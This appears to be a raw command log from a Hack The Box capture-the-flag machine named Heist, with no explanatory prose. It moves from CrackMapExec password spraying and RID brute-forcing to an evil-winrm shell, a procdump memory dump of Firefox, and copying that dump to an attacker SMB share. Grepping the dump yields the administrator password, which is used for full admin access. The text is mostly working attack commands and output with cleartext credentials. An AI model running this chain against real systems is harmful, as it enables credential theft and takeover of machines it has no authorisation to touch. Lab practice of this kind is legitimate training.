cme winrm 10.10.10.149 -u hazard -p stealth1agent

SMB         10.10.10.149    5985   SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
HTTP        10.10.10.149    5985   SUPPORTDESK      [*] http://10.10.10.149:5985/wsman
HTTP        10.10.10.149    5985   SUPPORTDESK      [-] SupportDesk\hazard:stealth1agent


cme smb 10.10.10.149 -u hazard -p stealth1agent -d SupportDesk.local --rid-brute

┌─[vagrant@parrot]─[~/Git/hackthebox/boxes/Heist]
└──╼ $cme smb 10.10.10.149 -u hazard -p stealth1agent -d SupportDesk.local --rid-brute
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk.local) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk.local\hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)


cme smb 10.10.10.149 -u users.txt -p passwords.txt -d SupportDesk.local

┌─[vagrant@parrot]─[~/Git/hackthebox/boxes/Heist]
└──╼ $cme smb 10.10.10.149 -u users.txt -p passwords.txt -d SupportDesk.local
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk.local) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\Chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\Jason:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk.local\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk.local\Chase:Q4)sJu\Y8qz*A3?d 



evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'

get-process -name Firefox

upload procdump64.exe

./procdump64.exe -ma 6576 firefox.dmp

sudo /home/vagrant/.local/bin/smbserver.py -smb2support -username guest -password guest share ./

net use x: \\10.10.14.3\share /user:guest guest

cmd /c "copy firefox.dmp X:\"

strings -el "firefox.dmp" | grep password

[//]: # (psexec.py 'administrator:4dD!5}x/re8]FBuZ@10.10.14.3')

evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
